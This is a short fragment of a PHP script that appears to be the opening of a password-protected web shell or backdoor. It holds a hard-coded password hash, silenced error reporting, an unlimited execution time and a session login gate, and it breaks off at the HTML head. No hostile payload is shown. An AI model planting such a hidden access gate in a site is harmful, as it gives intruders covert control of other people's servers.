<?php  $hashedPassword = '$P$B4ACSW3ZKQSPMjxcs7.jtf5q9TDui/0'; error_reporting(0); set_time_limit(0); session_start(); if (!isset($_SESSION['loggedIn'])) { $_SESSION['loggedIn'] = false; } if (isset($_POST['password'])) { if (password_verify($_POST['password'], $hashedPassword)) { $_SESSION['loggedIn'] = true; echo '<p>Login successful!</p>'; } } if (!$_SESSION['loggedIn']) { ?>
    <html>
    <head>
